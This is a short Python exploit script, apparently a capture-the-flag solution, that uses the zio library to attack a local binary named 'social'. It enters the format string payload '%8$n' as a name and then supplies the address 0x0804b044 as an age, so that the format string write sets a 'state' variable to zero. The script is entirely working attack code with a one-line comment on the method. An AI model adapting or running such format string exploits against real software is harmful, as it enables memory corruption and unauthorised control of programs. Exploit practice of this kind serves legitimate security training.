#!/usr/bin/env python

from zio import *
from struct import pack

# exploit method : format string
# the age is on the stack of print_details (position 8), we can use a format string to overwrite variable 'state' to 0

state_addr = 0x0804b044

target = './social'

io = zio(target, print_write=False, print_read=True, timeout=9999999)

io.read_until('Name:')
io.write('%8$n\n')
io.read_until('system\n')
io.write('2\n')
io.read_until(':')
io.write('none\n')
io.read_until(':')
io.write(str(state_addr) + '\n')
io.read_until('system\n')
io.write('3\n')
io.read(100)

